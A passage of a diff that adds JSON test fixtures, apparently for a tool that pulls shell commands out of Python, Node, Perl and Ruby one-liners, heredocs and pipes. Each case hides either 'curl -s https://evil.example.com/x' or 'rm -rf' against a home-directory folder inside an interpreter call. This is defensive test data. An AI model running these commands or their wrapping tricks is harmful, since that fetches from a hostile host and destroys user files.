+   "name": "py-Ic/check_output/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/check_output/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/Popen-shell/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.Popen(\"curl -s https://evil.example.com/x\", shell=True).wait()\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/Popen-shell/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.Popen(\"curl -s https://evil.example.com/x\", shell=True).wait()\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/Popen-shell/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.Popen(\"curl -s https://evil.example.com/x\", shell=True).wait()\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/Popen-shell/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.Popen(\"curl -s https://evil.example.com/x\", shell=True).wait()'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/Popen-shell/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.Popen('curl -s https://evil.example.com/x', shell=True).wait()\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/Popen-shell/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.Popen(\"curl -s https://evil.example.com/x\", shell=True).wait()'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/Popen-shell/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.Popen(\"curl -s https://evil.example.com/x\", shell=True).wait()'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-list/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"curl\", \"-s\", \"https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-list/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"curl\", \"-s\", \"https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/run-list/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"curl\", \"-s\", \"https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/run-list/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"curl\", \"-s\", \"https://evil.example.com/x\"])'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-list/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['curl', '-s', 'https://evil.example.com/x'])\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/run-list/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"curl\", \"-s\", \"https://evil.example.com/x\"])'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/run-list/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"curl\", \"-s\", \"https://evil.example.com/x\"])'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-split/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\".split())\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-split/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\".split())\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/run-split/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\".split())\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/run-split/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\".split())'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-split/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('curl -s https://evil.example.com/x'.split())\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/run-split/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\".split())'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/run-split/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\".split())'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-bash-c/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-bash-c/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-pipe/run-bash-c/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-c/run-bash-c/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-bash-c/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['bash', '-c', 'curl -s https://evil.example.com/x'])\"",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-Ic/run-bash-c/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-herestr/run-bash-c/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.popen/eg",
+   "cmd": "python3 - <<'PY'\nimport os; os.popen(\"curl -s https://evil.example.com/x\").read()\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.popen/eg",
+   "cmd": "python3 <<PY\nimport os; os.popen(\"curl -s https://evil.example.com/x\").read()\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/os.popen/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.popen(\"curl -s https://evil.example.com/x\").read()\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/os.popen/eg",
+   "cmd": "python3 -c 'import os; os.popen(\"curl -s https://evil.example.com/x\").read()'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.popen/eg",
+   "cmd": "python3 -c \"import os; os.popen('curl -s https://evil.example.com/x').read()\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/os.popen/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.popen(\"curl -s https://evil.example.com/x\").read()'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/os.popen/eg",
+   "cmd": "python3 - <<< 'import os; os.popen(\"curl -s https://evil.example.com/x\").read()'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/shlex/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess, shlex; subprocess.run(shlex.split(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/shlex/eg",
+   "cmd": "python3 <<PY\nimport subprocess, shlex; subprocess.run(shlex.split(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/shlex/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess, shlex; subprocess.run(shlex.split(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/shlex/eg",
+   "cmd": "python3 -c 'import subprocess, shlex; subprocess.run(shlex.split(\"curl -s https://evil.example.com/x\"))'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/shlex/eg",
+   "cmd": "python3 -c \"import subprocess, shlex; subprocess.run(shlex.split('curl -s https://evil.example.com/x'))\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/shlex/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess, shlex; subprocess.run(shlex.split(\"curl -s https://evil.example.com/x\"))'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/shlex/eg",
+   "cmd": "python3 - <<< 'import subprocess, shlex; subprocess.run(shlex.split(\"curl -s https://evil.example.com/x\"))'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/from-import/eg",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import run; run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/from-import/eg",
+   "cmd": "python3 <<PY\nfrom subprocess import run; run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/from-import/eg",
+   "cmd": "cat <<'PY' | python3 -\nfrom subprocess import run; run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/from-import/eg",
+   "cmd": "python3 -c 'from subprocess import run; run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/from-import/eg",
+   "cmd": "python3 -c \"from subprocess import run; run('curl -s https://evil.example.com/x', shell=True)\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/from-import/eg",
+   "cmd": "/usr/bin/python3 -I -c 'from subprocess import run; run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/from-import/eg",
+   "cmd": "python3 - <<< 'from subprocess import run; run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/execvp/eg",
+   "cmd": "python3 - <<'PY'\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/execvp/eg",
+   "cmd": "python3 <<PY\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-pipe/execvp/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-c/execvp/eg",
+   "cmd": "python3 -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-c-dq/execvp/eg",
+   "cmd": "python3 -c \"import os; os.execvp('bash', ['bash', '-c', 'curl -s https://evil.example.com/x'])\"",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-Ic/execvp/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-herestr/execvp/eg",
+   "cmd": "python3 - <<< 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-heredoc/pty.spawn/eg",
+   "cmd": "python3 - <<'PY'\nimport pty; pty.spawn([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/pty.spawn/eg",
+   "cmd": "python3 <<PY\nimport pty; pty.spawn([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-pipe/pty.spawn/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport pty; pty.spawn([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])\nPY",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-c/pty.spawn/eg",
+   "cmd": "python3 -c 'import pty; pty.spawn([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-c-dq/pty.spawn/eg",
+   "cmd": "python3 -c \"import pty; pty.spawn(['bash', '-c', 'curl -s https://evil.example.com/x'])\"",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-Ic/pty.spawn/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import pty; pty.spawn([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "py-herestr/pty.spawn/eg",
+   "cmd": "python3 - <<< 'import pty; pty.spawn([\"bash\", \"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "node-e-execSync/eg",
+   "cmd": "node -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "node-e-spawnSync/eg",
+   "cmd": "node -e 'require(\"child_process\").spawnSync(\"bash\", [\"-c\", \"curl -s https://evil.example.com/x\"])'",
+   "commands": [
+    "bash -c 'curl -s https://evil.example.com/x'"
+   ]
+  },
+  {
+   "name": "node-heredoc/eg",
+   "cmd": "node - <<'JS'\nrequire(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")\nJS",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "perl-e/eg",
+   "cmd": "perl -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "ruby-e/eg",
+   "cmd": "ruby -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system/dg",
+   "cmd": "python3 - <<'PY'\nimport os; os.system(\"rm -rf ~/marveen\")\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system/dg",
+   "cmd": "python3 <<PY\nimport os; os.system(\"rm -rf ~/marveen\")\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.system(\"rm -rf ~/marveen\")\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/os.system/dg",
+   "cmd": "python3 -c 'import os; os.system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system/dg",
+   "cmd": "python3 -c \"import os; os.system('rm -rf ~/marveen')\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/os.system/dg",
+   "cmd": "python3 - <<< 'import os; os.system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system-nl/dg",
+   "cmd": "python3 - <<'PY'\nimport os\nos.system(\"rm -rf ~/marveen\")\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system-nl/dg",
+   "cmd": "python3 <<PY\nimport os\nos.system(\"rm -rf ~/marveen\")\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system-nl/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport os\nos.system(\"rm -rf ~/marveen\")\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/os.system-nl/dg",
+   "cmd": "python3 -c 'import os\nos.system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system-nl/dg",
+   "cmd": "python3 -c \"import os\nos.system('rm -rf ~/marveen')\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system-nl/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import os\nos.system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-shell/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-shell/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/run-shell/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/run-shell/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-shell/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('rm -rf ~/marveen', shell=True)\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/run-shell/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/run-shell/dg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/call-shell/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.call(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/call-shell/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.call(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/call-shell/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.call(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/call-shell/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.call(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/call-shell/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.call('rm -rf ~/marveen', shell=True)\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/call-shell/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.call(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/call-shell/dg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.call(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/check_output/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.check_output(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/check_output/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.check_output(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/check_output/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.check_output(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/check_output/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.check_output(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/check_output/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.check_output('rm -rf ~/marveen', shell=True)\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/check_output/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.check_output(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/check_output/dg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.check_output(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/Popen-shell/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.Popen(\"rm -rf ~/marveen\", shell=True).wait()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/Popen-shell/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.Popen(\"rm -rf ~/marveen\", shell=True).wait()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/Popen-shell/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.Popen(\"rm -rf ~/marveen\", shell=True).wait()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/Popen-shell/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.Popen(\"rm -rf ~/marveen\", shell=True).wait()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/Popen-shell/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.Popen('rm -rf ~/marveen', shell=True).wait()\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/Popen-shell/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.Popen(\"rm -rf ~/marveen\", shell=True).wait()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/Popen-shell/dg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.Popen(\"rm -rf ~/marveen\", shell=True).wait()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-list/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"rm\", \"-rf\", \"/home/gabor/marveen\"])\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-list/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"rm\", \"-rf\", \"/home/gabor/marveen\"])\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/run-list/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"rm\", \"-rf\", \"/home/gabor/marveen\"])\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c/run-list/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/home/gabor/marveen\"])'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-list/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['rm', '-rf', '/home/gabor/marveen'])\"",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/run-list/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/home/gabor/marveen\"])'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/run-list/dg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/home/gabor/marveen\"])'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-split/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"rm -rf /home/gabor/marveen\".split())\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-split/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"rm -rf /home/gabor/marveen\".split())\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/run-split/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"rm -rf /home/gabor/marveen\".split())\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c/run-split/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"rm -rf /home/gabor/marveen\".split())'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-split/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('rm -rf /home/gabor/marveen'.split())\"",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/run-split/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"rm -rf /home/gabor/marveen\".split())'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/run-split/dg",
